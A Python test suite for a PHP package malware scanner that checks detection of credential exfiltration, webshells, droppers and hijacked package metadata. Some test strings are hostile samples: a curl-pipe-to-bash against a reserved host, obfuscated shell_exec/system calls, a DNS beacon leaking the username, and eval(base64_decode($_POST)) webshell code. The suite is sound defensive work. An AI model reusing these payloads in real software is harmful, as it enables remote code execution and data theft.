"""Canary + control tests:  python3 -m unittest  (from the repo root)

Every mal-* fixture must reach its expected level AND fire its expected rule; every ok-*
fixture (shapes popular packages really have) must scan SAFE. Fixtures are inert: hosts are
reserved (.invalid / TEST-NET) or obviously fake, tokens are CANARY strings, and nothing here
is ever installed or executed.
"""
import io
import json
import os
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import packagist_audit as pa  # noqa: E402

FIX = os.path.join(HERE, "fixtures")
EXPECT = {
    # real incident shapes
    "mal-phpass-env": ("CRITICAL", "credential_exfil"),      # 2022 hautelook/phpass hijack (AWS keys -> Heroku)
    "mal-laravel-rat": ("CRITICAL", "c2_loop"),              # 2025 RAT in autoload.files helper.php
    "mal-plugin-dropper": ("CRITICAL", "dropper"),           # composer-plugin download -> chmod -> exec
    "mal-webshell": ("CRITICAL", "webshell"),                # classic @eval(base64_decode($_POST[..]))
    # other shapes
    "mal-eval-packed": ("CRITICAL", "eval_decode"),
    "mal-plugin-curl-sh": ("CRITICAL", "download_execute"),
    "mal-plugin-authjson": ("CRITICAL", "credential_exfil"),
    "mal-plugin-persist": ("CRITICAL", "persistence_write"),
    "mal-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-revshell": ("CRITICAL", "reverse_shell"),
    "mal-obfuscated": ("HIGH", "obfuscation"),
    "mal-remote-include": ("CRITICAL", "remote_code"),
    "mal-script-lib": ("MEDIUM", "download_execute"),        # root-only script in a library: capped at MEDIUM
    "mal-script-project": ("CRITICAL", "download_execute"),  # create-project runs it
}
EXACT = {"mal-script-lib"}   # must land on exactly this level (proves the demotion)


def _scan(name):
    return pa.scan_package(pa.files_from_dir(os.path.join(FIX, name)), name)


class Canaries(unittest.TestCase):
    def test_every_fixture_has_an_expectation(self):
        for name in os.listdir(FIX):
            if name.startswith("mal-"):
                self.assertIn(name, EXPECT)

    def test_malicious(self):
        for name, (want, rule) in sorted(EXPECT.items()):
            with self.subTest(name):
                r = _scan(name)
                ids = {f["id"] for f in r["findings"]}
                self.assertIn(rule, ids, (name, r["findings"]))
                if name in EXACT:
                    self.assertEqual(r["risk_level"], want)
                else:
                    self.assertGreaterEqual(pa.SEV_ORDER[r["risk_level"]], pa.SEV_ORDER[want])

    def test_benign(self):
        for name in sorted(os.listdir(FIX)):
            if name.startswith("ok-"):
                with self.subTest(name):
                    r = _scan(name)
                    self.assertEqual(r["risk_level"], "SAFE", (name, r["findings"]))

    def test_hijack_2023_metadata(self):
        with open(os.path.join(HERE, "meta", "hijack-2023.json")) as fh:
            d = json.load(fh)
        versions = pa.expand_minified(d["packages"]["canary/abandoned-lib"])
        chosen = pa.pick_version(versions)
        self.assertEqual(chosen["version"], "2.0.1")
        self.assertEqual(versions[1]["type"], "library")   # minified fields inherited
        ids = {(m["severity"], m["id"]) for m in pa.metadata_checks(versions, chosen)}
        self.assertIn(("HIGH", "source_repo_changed"), ids)      # new owner + revived after 7 years
        self.assertIn(("INFO", "dormant_revival"), ids)
        # a repo move without the dormancy is only MEDIUM
        fresh = [dict(versions[0], time="2016-06-01T10:00:00+00:00")] + versions[1:]
        self.assertIn(("MEDIUM", "source_repo_changed"),
                      {(m["severity"], m["id"]) for m in pa.metadata_checks(fresh, fresh[0])})
        self.assertIn(("INFO", "abandoned"), ids)
        same = pa.metadata_checks(versions[1:], versions[1])
        self.assertFalse([m for m in same if m["id"] == "source_repo_changed"])


class Units(unittest.TestCase):
    def test_text(self):
        self.assertEqual(pa.scan("curl https://x.invalid/a | bash")["risk_level"], "CRITICAL")
        self.assertEqual(pa.scan("<?php $x = strtoupper('a');")["risk_level"], "SAFE")

    def test_hex_escaped_name(self):
        hidden = "<?php $f = \"\\x73\\x68\\x65\\x6c\\x6c\\x5f\\x65\\x78\\x65\\x63\"; $f($x);"
        self.assertEqual(pa.scan(hidden, ctx=None)["risk_level"], "HIGH")
        gif = "<?php $px = \"\\x47\\x49\\x46\\x38\\x39\\x61\\x01\\x00\"; $fn = $this->cb; $fn($px);"
        self.assertEqual(pa.scan(gif, ctx=None)["risk_level"], "SAFE")
        png = "<?php $h = chr(137) . chr(80) . chr(78) . chr(71) . chr(13); $f = $this->w; $f($h);"
        self.assertEqual(pa.scan(png, ctx=None)["risk_level"], "SAFE")
        sysc = "<?php $f = chr(115) . chr(121) . chr(115) . chr(116) . chr(101) . chr(109); $f($_x);"
        self.assertEqual(pa.scan(sysc, ctx=None)["risk_level"], "HIGH")

    def test_views(self):
        code, skel = pa.php_views("<html>eval(x)</html><?php // eval(base64_decode($_POST['x']))\n$a = 'eval(1)'; ?>tail")
        self.assertNotIn("eval(base64", code)
        self.assertIn("'eval(1)'", code)
        self.assertNotIn("eval(1)", skel)
        self.assertNotIn("<html>", code)
        self.assertEqual(code.count("\n"), 1)

    def test_skip_names(self):
        for p in ("appsec/run-tests-internal.php", "Std/ruleset-test.inc", "src/FooTest.php", "test.php"):
            self.assertTrue(pa.SKIP_NAME.search(p), p)
        for p in ("src/TestCase.php", "src/Latest.php", "src/attest.php", "src/Testing/X.php", "src/contest_rules.php"):
            self.assertFalse(pa.SKIP_NAME.search(p), p)

    def test_heldout_regressions(self):
        # PEAR-style relative includes and a template engine's data: include of its own compiled code
        self.assertEqual(pa.scan("<?php include 'HTTP/OAuth/Consumer.php'; require_once 'HTTP/Request2.php';", ctx=None)["risk_level"], "SAFE")
        self.assertEqual(pa.scan("<?php return include('data://text/plain,' . urlencode($php));", ctx=None)["risk_level"], "SAFE")
        self.assertEqual(pa.scan("<?php include 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==';", ctx=None)["risk_level"], "CRITICAL")
        # hand-rolled HTTP client + an unrelated proc_open helper is not a C2 loop
        mixed = ("<?php $fp = fsockopen($h, 80); while (!feof($fp)) { $r = fgets($fp, 128); $hdr .= $r; }"
                 "function run($command) { return proc_open($command, $d, $p); } $x = base64_decode($y);")
        self.assertEqual(pa.scan(mixed, ctx=None)["risk_level"], "SAFE")

    def test_dns(self):
        self.assertEqual(pa.scan("<?php $ip = gethostbyname(gethostname());", ctx=None)["risk_level"], "SAFE")
        beacon = "<?php gethostbyname(bin2hex(get_current_user()) . '.canary.invalid.');"
        self.assertEqual(pa.scan(beacon, ctx=None)["risk_level"], "HIGH")

    def test_oauth_loopback_is_not_a_reverse_shell(self):
        src = ("<?php $srv = stream_socket_server('tcp://127.0.0.1:0'); $c = stream_socket_client('tcp://127.0.0.1:1');"
               "$p = proc_open(['open', $url], [], $pipes); while (!feof($c)) { $l = fgets($c); }")
        self.assertEqual(pa.scan(src, ctx=None)["risk_level"], "SAFE")

    def test_views_aligned(self):
        src = "<?php /* c */ $a = 'x\ny'; $b = <<<EOT\nsystem($c);\nEOT;\n$d = `ls`; ?>html"
        code, skel = pa.php_views(src)
        self.assertEqual(len(code), len(skel))

    def test_call_quoted_in_code_sample(self):
        sample = "<?php $s = new CodeSample('preg_replace(\\'~(\\\\w)~e\\', \\'x\\', $c);');"
        self.assertEqual(pa.scan(sample, ctx=None)["risk_level"], "SAFE")
        self.assertEqual(pa.scan("<?php $c = preg_replace('~(\\w)~e', 'strtoupper(1)', $c);", ctx=None)["risk_level"], "HIGH")

    def test_heredoc_blanked_in_skeleton(self):
        _, skel = pa.php_views("<?php $s = <<<EOT\nsystem($_GET['x']);\nEOT;\n$y = 1;")
        self.assertNotIn("system", skel)
        self.assertIn("$y = 1", skel)

    def test_split_spec(self):
        self.assertEqual(pa.split_spec("symfony/console@v7.1.0"), ("symfony/console", "v7.1.0"))
        self.assertEqual(pa.split_spec("Monolog/Monolog"), ("monolog/monolog", "latest"))
        self.assertEqual(pa.split_spec("psr/log:3.0.0"), ("psr/log", "3.0.0"))

    def test_dist_url(self):
        self.assertEqual(pa.dist_url({"url": "https://api.github.com/repos/a/b/zipball/abc"}),
                         "https://codeload.github.com/a/b/legacy.zip/abc")

    def test_resolve_class(self):
        files = {"src/Plugin.php": "<?php namespace A\\B; class Plugin {}", "lib/C/D.php": "<?php class C_D {}"}
        auto = {"psr-4": {"A\\B\\": "src/"}, "psr-0": {"C_": "lib/"}}
        self.assertEqual(pa.resolve_class("A\\B\\Plugin", auto, files), "src/Plugin.php")
        self.assertEqual(pa.resolve_class("C_D", auto, files), "lib/C/D.php")

    def test_exec_contexts(self):
        files = {"composer.json": "", "src/P.php": "<?php namespace X; class P {}", "src/Q.php": "<?php",
                 "src/f.php": "<?php", "src/tests/T.php": "<?php"}
        comp = {"type": "composer-plugin", "autoload": {"psr-4": {"X\\": "src"}, "files": ["src/f.php"]},
                "extra": {"class": "X\\P"}}
        ctx, s = pa.exec_contexts(files, comp)
        self.assertEqual(ctx["src/P.php"], "plugin")
        self.assertEqual(ctx["src/Q.php"], "plugin")
        self.assertEqual(ctx["src/f.php"], "autoload-files")
        self.assertNotIn("src/tests/T.php", ctx)
        self.assertEqual(s["plugin_files"], ["src/P.php"])

    def test_lockfile(self):
        import tempfile
        with tempfile.NamedTemporaryFile("w", suffix=".lock", delete=False) as fh:
            json.dump({"packages": [{"name": "a/b", "version": "1.0.0",
                                     "dist": {"url": "https://api.github.com/repos/a/b/zipball/r1"}}],
                       "packages-dev": [{"name": "c/d", "version": "2.0.0", "dist": {"url": "https://x.invalid/d.zip"}}]}, fh)
        try:
            self.assertEqual(pa.lockfile_specs(fh.name),
                             [("a/b@1.0.0", "https://codeload.github.com/a/b/legacy.zip/r1"),
                              ("c/d@2.0.0", "https://x.invalid/d.zip")])
        finally:
            os.unlink(fh.name)

    def test_exit_code(self):
        import contextlib
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(pa.main(["--json", os.path.join(FIX, "ok-polyfill")]), 0)
            self.assertEqual(pa.main(["--json", os.path.join(FIX, "mal-webshell")]), 2)


if __name__ == "__main__":
    unittest.main()
